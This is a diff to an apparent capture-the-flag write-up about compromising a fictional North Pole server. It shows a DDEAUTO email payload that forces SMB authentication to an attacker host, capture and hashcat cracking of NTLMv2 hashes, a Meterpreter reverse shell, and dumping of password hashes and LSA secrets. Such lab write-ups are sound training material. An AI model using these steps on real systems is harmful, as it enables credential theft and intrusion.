@@ -103,6 +103,7 @@ Thanks!
 Alabaster Snowball.
 #+END_QUOTE
 
+#+CAPTION: Artist's Rendering of Alabaster Snowball
 [[./images/cookies.jpg]]
 
 ** Goal
@@ -209,6 +210,10 @@ module, and use it to download the PDF.
 
 ** Level 2 -- Meterpreter Shell
 
+#+begin_note
+Originally, the system had Windows Defender enabled, which would block some default Meterpreter payloads
+#+end_note
+
 Instead of just downloading the PDF file, we can modify our script to send a Python meterpreter payload.
 
 We start Meterpreter listening on our local system:
@@ -284,6 +289,131 @@ System Language : en_US
 Meterpreter     : python/windows
 #+END_SRC
 
+** Getting Alabaster's Password
+
+Being able to use Meterpreter is nice, but it sure would be cool if we
+could Remote Desktop, or see if Alabaster's password is in use
+elsewhere. We'll use Metasploit's SMB Authentication Capture module.
+
+#+begin_tip
+Try to avoid running Metasploit as root. In this case, we'll need to bind to a privileged port (445), but we can use =iptables= to redirect our traffic instead:
+=sudo iptables -A PREROUTING -t nat -p tcp --dport 445 -j REDIRECT --to-port 3445=
+#+end_tip
+
+#+BEGIN_SRC 
+msf exploit(handler) > use auxiliary/server/capture/smb
+msf auxiliary(smb) > info
+
+       Name: Authentication Capture: SMB
+     Module: auxiliary/server/capture/smb
+    License: Metasploit Framework License (BSD)
+       Rank: Normal
+
+Provided by:
+  hdm <x@hdm.io>
+
+Available actions:
+  Name     Description
+  ----     -----------
+  Sniffer
+
+Basic options:
+  Name        Current Setting   Required  Description
+  ----        ---------------   --------  -----------
+  CAINPWFILE                    no        The local filename to store the hashes in Cain&Abel format
+  CHALLENGE   1122334455667788  yes       The 8 byte server challenge
+  JOHNPWFILE                    no        The prefix to the local filename to store the hashes in John format
+  SRVHOST     0.0.0.0           yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
+  SRVPORT     445              yes       The local port to listen on.
+
+Description:
+  This module provides a SMB service that can be used to capture the
+  challenge-response password hashes of SMB client systems. Responses
+  sent by this service have by default the configurable challenge
+  string (\x11\x22\x33\x44\x55\x66\x77\x88), allowing for easy
+  cracking using Cain & Abel, L0phtcrack or John the ripper (with
+  jumbo patch). To exploit this, the target system must try to
+  authenticate to this module. One way to force an SMB authentication
+  attempt is by embedding a UNC path (\\SERVER\SHARE) into a web page
+  or email message. When the victim views the web page or email, their
+  system will automatically connect to the server specified in the UNC
+  share (the IP address of the system running this module) and attempt
+  to authenticate. Another option is using
+  auxiliary/spoof/{nbns,llmnr} to respond to queries for names the
+  victim is already looking for.
+
+msf auxiliary(smb) > set SRVPORT 3445
+SRVPORT => 3445
+msf auxiliary(smb) > set JOHNPWFILE alabaster_snowball.john
+JOHNPWFILE => alabaster_snowball.john
+msf auxiliary(smb) > run
+[*] Auxiliary module running as background job 3.
+#+END_SRC
+
+Now, we'll send the following command via e-mail:
+
+#+BEGIN_SRC 
+DDEAUTO c:\\windows\\system32\\cmd.exe "/k dir \\\\1.2.3.4\\a"
+#+END_SRC
+
+And sure enough, we get the following hashes:
+
+#+BEGIN_SRC 
+[*] SMB Captured - 2018-12-20 17:08:24 +0000
+NTLMv2 Response Captured from 35.185.57.190:49759 - 35.185.57.190
+USER:alabaster_snowball DOMAIN:HHC17-SMB-SERVE OS: LM:
+LMHASH:Disabled
+LM_CLIENT_CHALLENGE:Disabled
+NTHASH:314d4bd798cac0c5fa2bb107ba248cc6
+NT_CLIENT_CHALLENGE:0101000000000000d1b912a0358ad30143592f0cabfa891000000000020000000000000000000000
+[*] SMB Captured - 2018-12-20 17:08:24 +0000
+NTLMv2 Response Captured from 35.185.57.190:49759 - 35.185.57.190
+USER:alabaster_snowball DOMAIN:HHC17-SMB-SERVE OS: LM:
+LMHASH:Disabled
+LM_CLIENT_CHALLENGE:Disabled
+NTHASH:aaa7328ccd721a5e96bfb188eb4ecbdd
+NT_CLIENT_CHALLENGE:010100000000000001431ca0358ad301c89b21fb5e4c160d00000000020000000000000000000000
+[*] SMB Captured - 2018-12-20 17:08:24 +0000
+NTLMv2 Response Captured from 35.185.57.190:49759 - 35.185.57.190
+USER:alabaster_snowball DOMAIN:HHC17-SMB-SERVE OS: LM:
+LMHASH:Disabled
+LM_CLIENT_CHALLENGE:Disabled
+NTHASH:71570491da3f413ce830788429820789
+NT_CLIENT_CHALLENGE:010100000000000024042ba0358ad301a28a0bc07ea8214300000000020000000000000000000000
+#+END_SRC
+
+We now have the following file:
+
+#+BEGIN_SRC 
+alabaster_snowball::HHC17-SMB-SERVE:1122334455667788:3d0a58908a34215103b43a000b5807ab:0101000000000000f0a52fe4358ad3018486290b6477913300000000020000000000000000000000
+alabaster_snowball::HHC17-SMB-SERVE:1122334455667788:5c63d79712f174de38ee30de2136b53e:0101000000000000e4e554e4358ad301fee549fa52c9b5ef00000000020000000000000000000000
+alabaster_snowball::HHC17-SMB-SERVE:1122334455667788:de4559d983096a0a895484a61834283f:0101000000000000fb6a68e4358ad301645b79e4a5ed58c300000000020000000000000000000000
+#+END_SRC
+
+We'll use =hashcat= to crack this:
+
+#+BEGIN_SRC 
+hashcat64.bin -m 5600 -a 0 alabaster_snowball.john.netntlmv2 wordlist.txt -O -w 4
+...
+alabaster_snowball::HHC17-SMB-SERVE:1122334455667788:3d0a58908a3...:Carried_mass_it_reader1
+alabaster_snowball::HHC17-SMB-SERVE:1122334455667788:5c63d79712f...:Carried_mass_it_reader1
+alabaster_snowball::HHC17-SMB-SERVE:1122334455667788:de4559d9830...:Carried_mass_it_reader1
+Session..........: hashcat
+Status...........: Cracked
+Hash.Type........: NetNTLMv2
+...
+#+END_SRC
+
+Armed with a password, we can remote desktop:
+
+#+CAPTION: Logging in to EMI as Alabaster via RDP
+#+attr_html: :width 500px
+[[./images/alabaster_rdp.png]]
+
+Woot! We're hand-waving some of this for now, as there will be a
+longer discussion about how we cracked passwords. TODO link to that
+discussion.
+
 ** Next up -- Privilege Escalation!
 
 Unfortunately, our commands only run as Alabaster, who is just a
@@ -309,7 +439,7 @@ passw = 'power instrument gasoline film'
 systems moving from the public IPs we found during the Recon stage, to
 private ones).
 
-This service was running as the alabsster_snowball user that we could
+This service was running as the alabaster_snowball user that we could
 already run commands as, so it wasn't a target for privilege
 elevation.
 
@@ -381,7 +511,9 @@ will cause Python to search for =glob.py= in the current directory,
 and then in some system-wide directories. If we can write a malicious
 =C:\Program Files\WindowsGrabber\glob.py=, the next time the service restarts, our code will run as LocalSystem.
 
-However, we need to take great care to not actually break =alabaster_snowball.py=.
+#+begin_danger
+These files can break the =alabaster_snowball.py= script. Because they're being written as privileged, the regular Alabaster account cannot modify or delete them. Take great care in what you send!
+#+end_danger
 
 Our file ends up looking like this:
 
@@ -471,7 +603,8 @@ HELO l2s
 MAIL FROM:<wunorse.openslae@northpolechristmastown.com>
 250 2.1.0 Ok
 RCPT TO:<alabaster.snowball@northpolechristmastown.com>
-550 5.7.1 <alabaster.snowball@northpolechristmastown.com>: Recipient address rejected: Message rejected due to: SPF fail - not authorized. Please see http://www.openspf.net/Why?s=mfrom;id=wunorse.openslae@northpolechristmastown.com;ip=10.142.0.3;r=alabaster.snowball@northpolechristmastown.com
+550 5.7.1 <alabaster.snowball@northpolechristmastown.com>: Recipient address rejected: Message rejected due to: SPF fail - not authorized. 
+Please see http://www.openspf.net/Why?s=mfrom;id=wunorse.openslae@northpolechristmastown.com;ip=10.142.0.3;r=alabaster.snowball@northpolechristmastown.com
 #+END_SRC
 
 Foiled! If we dig a little deeper however, and we use our =nmap= scan results, we'll find that there's another SMTP service listening on port 2525 which *will* allow us to send our e-mail:
@@ -571,19 +704,117 @@ ExitOnSession => false
 resource (msf_payloads/windows-meterpreter-stageless-reverse-tcp-4445-exe.rc)> run -j
 [*] Exploit running as background job 0.
 Meterpreter session 1 opened (1.2.3.4:4445 -> 35.185.57.190:49672) at 2018-01-09 05:08:43 +0000
+msf exploit(handler) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                                           Connection
+  --  ----  ----                     -----------                                           ----------
+  1         meterpreter x64/windows  HHC17-SMB-SERVE\LocalSystem @ HHC17-SMB-SERVE  1.2.3.4:4445 -> 35.185.57.190:49756 (10.142.0.8)
 #+END_SRC
 
-** Common Pitfalls
-   :PROPERTIES:
-   :CUSTOM_ID: common-pitfalls
-   :END:
+And now, we've managed to elevate our credentials. Let's dump the hashes on the system:
 
-Do we know what issue(s) people were running into?
+#+BEGIN_SRC 
+msf exploit(multi) > use post/windows/gather/credentials/credential_collector
+msf post(credential_collector) > run
 
-** About the Challenge
-   :PROPERTIES:
-   :CUSTOM_ID: about-the-challenge
-   :END:
+[*] Running module against HHC17-SMB-SERVE
+[+] Collecting hashes...
+    Extracted: Administrator:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
+    Extracted: alabaster_snowball:aad3b435b51404eeaad3b435b51404ee:10e2fa00c44d10ca05d399f47ed13351
+    Extracted: DefaultAccount:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
+    Extracted: Guest:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
+    Extracted: sysadmin:aad3b435b51404eeaad3b435b51404ee:27309e9a73764938860b4a1ed7c0392b
+[+] Collecting tokens...
+    HHC17-SMB-SERVE\alabaster_snowball
+    IIS APPPOOL\DefaultAppPool
+    NT AUTHORITY\IUSR
+    NT AUTHORITY\LOCAL SERVICE
+    NT AUTHORITY\NETWORK SERVICE
+    NT AUTHORITY\SYSTEM
+    Window Manager\DWM-1
+    NT AUTHORITY\ANONYMOUS LOGON
+[*] Post module execution completed
+#+END_SRC
 
-How was the challenge setup? Was there a better way to secure this
-system?
+We could try to crack some hashes, but there's an easier way. Let's check the LSA secrets:
+
+#+BEGIN_SRC 
+msf post(credential_collector) > use post/windows/gather/lsa_secrets
+msf post(lsa_secrets) > info
+
+       Name: Windows Enumerate LSA Secrets
+     Module: post/windows/gather/lsa_secrets
+   Platform: Windows
+       Arch:
+       Rank: Normal
+
+Provided by:
+  Rob Bathurst <rob.bathurst@foundstone.com>
+
+Compatible session types:
+  Meterpreter
+
+Basic options:
+  Name     Current Setting  Required  Description
+  ----     ---------------  --------  -----------
+  SESSION  1                yes       The session to run this module on.
+
+Description:
+  This module will attempt to enumerate the LSA Secrets keys within
+  the registry. The registry value used is:
+  HKEY_LOCAL_MACHINE\Security\Policy\Secrets\. Thanks goes to Maurizio
+  Agazzini and Mubix for decrypt code from cachedump.
+
+msf post(lsa_secrets) > run
+
+[*] Executing module against HHC17-SMB-SERVE
+[*] Obtaining boot key...
+[*] Obtaining Lsa key...
+[*] Vista or above system
+[+] Key: DPAPI_SYSTEM
+ Decrypted Value: ,2#B@:o~NY*#(1]`Vx
+
+[+] Key: NL$KM
+ Decrypted Value: @.tUb#=VQc_Y%&P1`gG;g1p0I)me& }Z/zXP`
+
+[+] Key: _SC_agrabber
+ Username: .\alabaster_snowball
+ Decrypted Value: .Carried_mass_it_reader1
+
+[*] Writing to loot...
+[*] Data saved in: /home/vladg/.msf4/loot/20180109050031_default_10.142.0.8_registry.lsa.sec_967944.txt
+[*] Post module execution completed
+#+END_SRC
+
+We can verify this with our hash, or via RDP: alabaster's password is
+=Carried_mass_it_reader1=, which matches what we got before.
+
+At this point, the system is pretty well compromised. We were unable to crack the sysadmin user's hash, or pivot from this system to other systems using our privileged access.
+
+We did, however, find some neat things in the Firefox browsing history of the sysadmin user:
+
+#+BEGIN_SRC 
+'https://www.python.org/downloads/release/python-362/'
+'https://www.google.com/search?q=non+sucky+servaice+manager&ie=utf-8&oe=utf-8&client=firefox-b-1-ab'
+'https://nssm.cc/release/nssm-2.24.zip'
+'http://localhost/'
+'https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx'
+'http://localhost/test.aspx'
+'https://stackoverflow.com/questions/4388066/the-page-you-are-requesting-cannot-be-served-because-of-the-extension-configura'
+'https://www.google.com/search?q=how+to+use+aspnet_regiis&ie=utf-8&oe=utf-8&client=firefox-b-1-ab'
+'https://www.google.com/search?q=aspnet_regiis+%3A+The+term+%27aspnet_regiis%27+is+not+recognized+as+the+name+of+a+cmdlet&ie=utf-8&oe=utf-8&client=firefox-b-1-ab'
+'http://exescan.net/exes/a/aspnet_regiis-exe-file'
+'https://www.google.com/search?q=how+to+configure+asp+to+run+on+iis&ie=utf-8&oe=utf-8&client=firefox-b-1-ab'
+'https://docs.microsoft.com/en-us/iis/application-frameworks/scenario-build-an-aspnet-website-on-iis/configuring-step-1-install-iis-and-asp-net-modules'
+'https://www.google.com/search?q=enable+asp+on+windows+2016&ie=utf-8&oe=utf-8&client=firefox-b-1-ab'
+'https://docs.microsoft.com/en-us/biztalk/core/how-to-enable-asp-net-4-0-for-published-web-services'
+'https://az764295.vo.msecnd.net/stable/dcee2202709a4f223185514b9275aa4229841aa7/VSCodeSetup-x64-1.18.0.exe'
+'http://127.0.0.1/'
+'http://127.0.0.1/evil.aspx'
+'http://localhost/cmd.aspx'
+'http://localhost/jerry.aspx'
+'http://localhost/ok.txt'
+#+END_SRC
